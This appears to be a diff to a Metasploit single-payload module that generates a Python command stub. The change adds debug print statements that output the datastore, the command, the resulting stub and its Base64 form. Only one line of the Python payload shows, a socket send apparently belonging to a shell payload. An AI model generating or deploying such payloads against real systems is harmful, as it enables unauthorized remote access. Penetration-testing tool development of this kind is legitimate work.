@@ -1,4 +1,5 @@
 module MetasploitModule
+
   CachedSize = :dynamic
 
   include Msf::Payload::Single
@@ -27,6 +28,7 @@ module MetasploitModule
   end
 
   def generate(_opts = {})
+    puts 'generating....'
     super + command_string
   end
 
@@ -47,6 +49,12 @@ module MetasploitModule
       	so.send(o)
     PYTHON
 
-    py_create_exec_stub(cmd)
+    puts "datastore=#{datastore.to_h}"
+    puts "cmd=#{cmd}"
+
+    result = py_create_exec_stub(cmd)
+    puts "result=#{result}"
+    puts "result_b64=#{Base64.strict_encode64(result)}"
+    result
   end
 end
